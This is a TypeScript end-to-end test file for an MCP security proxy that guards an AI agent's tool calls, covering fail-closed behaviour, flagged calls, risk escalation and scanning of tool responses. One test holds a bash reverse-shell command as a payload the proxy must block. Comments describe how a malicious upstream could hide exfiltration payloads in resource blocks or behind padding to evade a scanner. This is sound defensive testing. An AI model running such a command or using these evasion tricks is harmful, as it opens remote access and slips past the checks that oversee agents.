/**
 * Proxy transport E2E — agent <-> proxy <-> upstream over in-memory transports.
 *
 * Complements proxy-e2e.test.ts (which tests the ProxyEvaluator / L2 brain with
 * real rules). This one drives the FULL flow through real MCP machinery to
 * prove the L1 inline gate + forwarding works: a benign call reaches upstream
 * and returns its result; a block-on-sight payload is blocked at the gate and
 * never reaches upstream. Uses an always-allow evaluator so the assertions are
 * about the gate + transport, not the ATR corpus.
 */
import { describe, it, expect } from 'vitest';
import { Server } from '@modelcontextprotocol/sdk/server/index.js';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { CallToolRequestSchema, ListToolsRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import { MCPProxy } from '../src/proxy.js';
import type { ProxyEvaluatorLike } from '../src/proxy.js';

const allowAll: ProxyEvaluatorLike = {
  loadRules: async () => 0,
  evaluateToolCall: async () => ({
    outcome: 'allow',
    reason: '',
    matchedRules: [],
    confidence: 0,
    durationMs: 0,
  }),
  evaluateToolResponse: async () => ({
    outcome: 'allow',
    reason: '',
    matchedRules: [],
    confidence: 0,
    durationMs: 0,
  }),
};

/** A minimal upstream MCP server exposing echo + run tools. */
function makeUpstream(): Server {
  const server = new Server(
    { name: 'test-upstream', version: '0.0.1' },
    { capabilities: { tools: {} } }
  );
  server.setRequestHandler(ListToolsRequestSchema, async () => ({
    tools: [
      { name: 'echo', description: 'echo text', inputSchema: { type: 'object' as const } },
      { name: 'run', description: 'run a command', inputSchema: { type: 'object' as const } },
    ],
  }));
  server.setRequestHandler(CallToolRequestSchema, async (req) => {
    const args = (req.params.arguments ?? {}) as Record<string, unknown>;
    if (req.params.name === 'echo') {
      return { content: [{ type: 'text' as const, text: String(args['text'] ?? '') }] };
    }
    return { content: [{ type: 'text' as const, text: 'ran' }] };
  });
  return server;
}

/** Wire upstream <-> proxy <-> agent over in-memory transports. */
async function wireStack(): Promise<Client> {
  const upstream = makeUpstream();
  const [upSrv, proxyCli] = InMemoryTransport.createLinkedPair();
  await upstream.connect(upSrv);

  const proxy = new MCPProxy(
    { upstreamCommand: 'noop', upstreamArgs: [] },
    { evaluator: allowAll }
  );
  const [proxySrv, agentCli] = InMemoryTransport.createLinkedPair();
  await proxy.connect(proxyCli, proxySrv);

  const agent = new Client({ name: 'test-agent', version: '0.0.1' }, { capabilities: {} });
  await agent.connect(agentCli);
  return agent;
}

function textOf(result: unknown): string {
  const content = (result as { content?: Array<{ text?: string }> }).content;
  return content?.map((c) => c.text ?? '').join('\n') ?? '';
}

/** An evaluator that always throws — simulates a crashed/timed-out async brain. */
const throwingEvaluator: ProxyEvaluatorLike = {
  loadRules: async () => 0,
  evaluateToolCall: async () => {
    throw new Error('evaluator unavailable');
  },
  evaluateToolResponse: async () => {
    throw new Error('evaluator unavailable');
  },
};

/** An evaluator that always returns 'ask' on the pre-call — flagged, not denied. */
const askOnCall: ProxyEvaluatorLike = {
  loadRules: async () => 0,
  evaluateToolCall: async () => ({
    outcome: 'ask',
    reason: 'low-confidence match',
    matchedRules: ['ATR-2026-00001'],
    confidence: 40,
    durationMs: 0,
  }),
  evaluateToolResponse: async () => ({
    outcome: 'allow',
    reason: '',
    matchedRules: [],
    confidence: 0,
    durationMs: 0,
  }),
};

/** Wire the stack with a chosen evaluator (for fail-mode tests). */
async function wireWith(evaluator: ProxyEvaluatorLike): Promise<Client> {
  const upstream = makeUpstream();
  const [upSrv, proxyCli] = InMemoryTransport.createLinkedPair();
  await upstream.connect(upSrv);
  const proxy = new MCPProxy({ upstreamCommand: 'noop', upstreamArgs: [] }, { evaluator });
  const [proxySrv, agentCli] = InMemoryTransport.createLinkedPair();
  await proxy.connect(proxyCli, proxySrv);
  const agent = new Client({ name: 'test-agent', version: '0.0.1' }, { capabilities: {} });
  await agent.connect(agentCli);
  return agent;
}

describe('MCPProxy fail-mode (security-first default)', () => {
  it('fails CLOSED by default — a benign call is DENIED when the evaluator errors', async () => {
    delete process.env['PANGUARD_PROXY_FAIL_MODE'];
    const agent = await wireWith(throwingEvaluator);
    const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
    // Evaluator threw → fail-closed → the call is blocked, never forwarded.
    expect(textOf(r)).toContain('BLOCKED');
  });

  it('honors PANGUARD_PROXY_FAIL_MODE=open — forwards when the evaluator errors', async () => {
    process.env['PANGUARD_PROXY_FAIL_MODE'] = 'open';
    try {
      const agent = await wireWith(throwingEvaluator);
      const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
      expect(textOf(r)).toBe('hello world');
    } finally {
      delete process.env['PANGUARD_PROXY_FAIL_MODE'];
    }
  });
});

describe("MCPProxy 'ask' verdict (logged-and-forwarded, never silent)", () => {
  it('writes a loud FLAGGED (ask) line and still forwards the call', async () => {
    const lines: string[] = [];
    const orig = process.stderr.write.bind(process.stderr);
    // Capture stderr for the duration of this call.
    process.stderr.write = ((chunk: string | Uint8Array): boolean => {
      lines.push(typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString());
      return true;
    }) as typeof process.stderr.write;
    try {
      const agent = await wireWith(askOnCall);
      const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
      // 'ask' is logged-and-forwarded: the upstream result comes back unchanged...
      expect(textOf(r)).toBe('hello world');
      // ...but it must NOT be silent — the FLAGGED (ask) line names the tool.
      const flagged = lines.join('');
      expect(flagged).toContain('FLAGGED (ask)');
      expect(flagged).toContain('echo');
    } finally {
      process.stderr.write = orig;
    }
  });
});

describe('MCPProxy transport e2e (full forward/block flow)', () => {
  it('forwards a benign tool call to upstream and returns its result', async () => {
    const agent = await wireStack();
    const r = await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });
    expect(textOf(r)).toBe('hello world');
  });

  it('blocks a reverse-shell payload at the gate, never reaching upstream', async () => {
    const agent = await wireStack();
    const r = await agent.callTool({
      name: 'run',
      arguments: { cmd: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
    });
    expect(textOf(r)).toContain('BLOCKED');
  });

  it('lists upstream tools through the proxy', async () => {
    const agent = await wireStack();
    const tools = await agent.listTools();
    expect(tools.tools.map((t) => t.name).sort()).toEqual(['echo', 'run']);
  });
});

// ── (E) tool_call routing ──────────────────────────────────────────────────
// The PreToolUse evaluation must classify an MCP tool call as a 'tool_call'
// event (NOT 'mcp_exchange'), so the full tool_call rule family runs. A prior
// bug passed the wrong (or no) eventType, silently skipping ~44 tool_call rules
// on every MCP call. Lock the third argument the proxy hands to the evaluator.
describe('MCPProxy PreToolUse event routing (proxy.ts callTool -> evaluateToolCall 3rd arg)', () => {
  it("evaluates the call as a 'tool_call' event, not 'mcp_exchange'", async () => {
    const calls: Array<{
      toolName: string;
      args: Record<string, unknown>;
      eventType?: string;
    }> = [];
    // Spy evaluator: records exactly how the proxy invokes evaluateToolCall.
    const spy: ProxyEvaluatorLike = {
      loadRules: async () => 0,
      evaluateToolCall: async (toolName, args, eventType) => {
        calls.push({ toolName, args, eventType });
        return { outcome: 'allow', reason: '', matchedRules: [], confidence: 0, durationMs: 0 };
      },
      evaluateToolResponse: async () => ({
        outcome: 'allow',
        reason: '',
        matchedRules: [],
        confidence: 0,
        durationMs: 0,
      }),
    };
    const agent = await wireWith(spy);
    await agent.callTool({ name: 'echo', arguments: { text: 'hello world' } });

    expect(calls).toHaveLength(1);
    // The exact contract the fix restores: third arg is the 'tool_call' event tag.
    expect(calls[0]!.eventType).toBe('tool_call');
    // And the first two args are still the tool name + its args (not mangled).
    expect(calls[0]!.toolName).toBe('echo');
    expect(calls[0]!.args).toEqual({ text: 'hello world' });
  });
});

// ── (F) confidence 0-1 normalization ────────────────────────────────────────
// The ATR engine reports match confidence on a 0-1 scale, but the session-risk
// escalation threshold is 0-100 (ESCALATE_CONFIDENCE=95). Without normalization
// a real deny at confidence 0.98 compared 0.98 >= 95 -> false, so a genuine
// high-confidence deny NEVER escalated the session. recordEvalVerdict must scale
// 0-1 up before the threshold check. Drive it exactly on the 0-1 scale.
describe('MCPProxy session-risk escalation (recordEvalVerdict 0-1 normalization)', () => {
  function proxy(): MCPProxy {
    return new MCPProxy({ upstreamCommand: 'noop', upstreamArgs: [] });
  }

  it('a 0-1-scale high-confidence deny (0.98) escalates the session -> fast-blocks next call', () => {
    const p = proxy();
    // Before: a benign call is allowed by the inline gate.
    expect(p.gateCheck('echo', { text: 'hi' }).allow).toBe(true);
    // A real ATR deny arrives on the native 0-1 confidence scale.
    p.recordEvalVerdict({ outcome: 'deny', confidence: 0.98, matchedRules: ['ATR-2026-00042'] });
    // After: the session is 'high' risk -> the gate fast-blocks WITHOUT the
    // async evaluator running, and marks the verdict as escalated.
    const after = p.gateCheck('echo', { text: 'hi' });
    expect(after.allow).toBe(false);
    expect(after.escalated).toBe(true);
    expect(after.reason).toContain('containment');
  });

  it('a 0-1-scale low-confidence deny (0.70) does NOT escalate (single-FP protection)', () => {
    const p = proxy();
    p.recordEvalVerdict({ outcome: 'deny', confidence: 0.7, matchedRules: ['ATR-Y'] });
    // 0.70 -> 70 < 95 threshold, so the session stays open.
    expect(p.gateCheck('echo', { text: 'hi' }).allow).toBe(true);
  });

  it('a 0-1-scale allow at max confidence (1.0) never escalates', () => {
    const p = proxy();
    p.recordEvalVerdict({ outcome: 'allow', confidence: 1.0, matchedRules: [] });
    expect(p.gateCheck('echo', { text: 'hi' }).allow).toBe(true);
  });
});

// ── (G) PostToolUse non-text block serialization + 256KB cap ─────────────────
// A malicious upstream can smuggle an exfil/injection payload inside a non-text
// content block (e.g. an embedded resource whose resource.text carries the
// payload). A text-only extractor would silently drop it. The proxy must
// JSON-serialize EVERY block so the payload reaches the response scanner, and
// the cap must be 256KB (not 10KB) so padding past a tiny cap can't evade it.

/** Upstream that returns a chosen content array for tool 'leak'. */
function makeResourceUpstream(content: Array<Record<string, unknown>>): Server {
  const server = new Server(
    { name: 'test-upstream', version: '0.0.1' },
    { capabilities: { tools: {} } }
  );
  server.setRequestHandler(ListToolsRequestSchema, async () => ({
    tools: [{ name: 'leak', description: 'leak', inputSchema: { type: 'object' as const } }],
  }));
  server.setRequestHandler(CallToolRequestSchema, async () => ({ content }));
  return server;
}

/** Wire upstream(content) <-> proxy(spy) <-> agent; returns the captured scans. */
async function wireResourceStack(
  content: Array<Record<string, unknown>>
): Promise<{ agent: Client; scanned: string[] }> {
  const scanned: string[] = [];
  const captureResponse: ProxyEvaluatorLike = {
    loadRules: async () => 0,
    evaluateToolCall: async () => ({
      outcome: 'allow',
      reason: '',
      matchedRules: [],
      confidence: 0,
      durationMs: 0,
    }),
    evaluateToolResponse: async (_tool, response) => {
      scanned.push(response);
      return { outcome: 'allow', reason: '', matchedRules: [], confidence: 0, durationMs: 0 };
    },
  };
  const upstream = makeResourceUpstream(content);
  const [upSrv, proxyCli] = InMemoryTransport.createLinkedPair();
  await upstream.connect(upSrv);
  const proxy = new MCPProxy(
    { upstreamCommand: 'noop', upstreamArgs: [] },
    { evaluator: captureResponse }
  );
  const [proxySrv, agentCli] = InMemoryTransport.createLinkedPair();
  await proxy.connect(proxyCli, proxySrv);
  const agent = new Client({ name: 'test-agent', version: '0.0.1' }, { capabilities: {} });
  await agent.connect(agentCli);
  return { agent, scanned };
}

describe('MCPProxy PostToolUse response serialization (non-text blocks + 256KB cap)', () => {
  it('serializes a non-text resource block so its embedded payload reaches the scanner', async () => {
    const { agent, scanned } = await wireResourceStack([
      { type: 'resource', resource: { uri: 'file:///evil', text: 'EXFIL_PAYLOAD_MARKER' } },
    ]);
    await agent.callTool({ name: 'leak', arguments: {} });

    expect(scanned).toHaveLength(1);
    // The embedded resource.text must not be silently dropped by a text-only
    // extractor — the whole block is JSON-serialized into the scanned string.
    expect(scanned[0]).toContain('EXFIL_PAYLOAD_MARKER');
  });

  it('keeps a payload buried after >10KB of padding inside the scanned string (256KB cap)', async () => {
    // Padding pushes the payload well past the old 10KB cap. With a 10KB cap the
    // marker at ~12KB would be sliced off; the 256KB cap keeps it in scope.
    const padding = 'A'.repeat(12 * 1024);
    const { agent, scanned } = await wireResourceStack([
      {
        type: 'resource',
        resource: { uri: 'file:///evil', text: padding + 'PADDED_PAYLOAD_MARKER' },
      },
    ]);
    await agent.callTool({ name: 'leak', arguments: {} });

    expect(scanned).toHaveLength(1);
    // Payload sits past the old 10KB cap but well within 256KB -> still scanned.
    expect(scanned[0]!.length).toBeGreaterThan(10 * 1024);
    expect(scanned[0]).toContain('PADDED_PAYLOAD_MARKER');
  });
});
